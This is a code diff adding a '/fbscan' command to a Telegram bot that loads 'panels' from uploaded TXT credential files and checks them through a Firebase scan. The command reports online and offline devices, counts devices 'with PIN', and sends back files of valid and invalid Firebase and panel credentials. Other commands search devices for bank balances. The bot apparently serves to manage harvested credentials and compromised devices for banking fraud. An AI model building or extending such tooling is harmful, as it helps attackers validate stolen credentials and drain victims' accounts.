@@ -4,6 +4,7 @@ import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'fs';
 import { join } from 'path';
 import { parseTxtCredentials, fetchAllPanels } from './lib/panelCore.mjs';
 import { parseSearchCommand, runSearch, searchHelpText } from './lib/searchRunner.mjs';
+import { runFirebaseScan } from './lib/panelScan.mjs';
 import {
   extractSearchKeywords,
   tierFromRest,
@@ -60,6 +61,7 @@ bot.start(ctx => {
       '📩 .txt + caption `addtxt` / `/fb`\n' +
       '🔎 `/search` — menu\n' +
       '⚡ `/search avl/bal, bank online` → tap options\n' +
+      '🔥 `/fbscan` — fast online/offline report (no SMS)\n' +
       '/status · /done',
     { parse_mode: 'Markdown' }
   );
@@ -330,6 +332,64 @@ bot.command('online', ctx => {
   if (!cached?.devices?.length) return ctx.reply('Pehle /search.');
   const online = cached.devices.filter(d => d.status);
   ctx.reply(`Online: ${online.length}`);
+});
+
+/** Fast Firebase scan — automatic-tool jaisa (clients only, TXT files) */
+bot.command('fbscan', async ctx => {
+  const n = refreshPanelsFromDisk();
+  if (!n) return ctx.reply('Pehle `addtxt` se panels add karo.', { parse_mode: 'Markdown' });
+  const uid = ctx.from.id;
+  if (SEARCH_ABORT.get(uid) === 'running') {
+    return ctx.reply('Pehle /done bhejo.');
+  }
+  SEARCH_ABORT.set(uid, 'running');
+  const status = await ctx.reply(`🚀 Aapka scan start ho gaya hai!\n📥 0/${n}`);
+  let lastEdit = 0;
+  try {
+    const out = await runFirebaseScan(globalPanels, prog => {
+      if (SEARCH_ABORT.get(uid) !== 'running') return;
+      const now = Date.now();
+      if (now - lastEdit < 2000 && prog.panelsDone < prog.panelsTotal) return;
+      lastEdit = now;
+      ctx.telegram
+        .editMessageText(
+          ctx.chat.id,
+          status.message_id,
+          undefined,
+          `📥 ${prog.panelsDone}/${prog.panelsTotal}\n🟢 ${prog.online} · 🔴 ${prog.offline} · 💳 PIN ${prog.withPin}`
+        )
+        .catch(() => {});
+    });
+
+    if (SEARCH_ABORT.get(uid) !== 'running') return;
+
+    await ctx.reply(out.report);
+    await ctx.replyWithDocument(
+      Input.fromBuffer(Buffer.from(out.files.valid_firebase, 'utf8'), 'valid_firebase.txt')
+    );
+    await ctx.replyWithDocument(
+      Input.fromBuffer(Buffer.from(out.files.valid_panels, 'utf8'), 'valid_panels.txt')
+    );
+    await ctx.replyWithDocument(
+      Input.fromBuffer(Buffer.from(out.files.invalid_panels, 'utf8'), 'invalid_panels.txt')
+    );
+    await ctx.telegram.editMessageText(
+      ctx.chat.id,
+      status.message_id,
+      undefined,
+      `✅ Complete ${out.stats.panelsDone}/${out.stats.panelsTotal} · ${out.stats.elapsed.toFixed(0)}s · Files upar ☝️`
+    );
+  } catch (e) {
+    await ctx.telegram
+      .editMessageText(ctx.chat.id, status.message_id, undefined, '❌ ' + e.message)
+      .catch(() => {});
+  } finally {
+    SEARCH_ABORT.delete(uid);
+  }
+});
+
+process.on('unhandledRejection', err => {
+  console.error('unhandledRejection', err);
 });
 
 bot.launch();
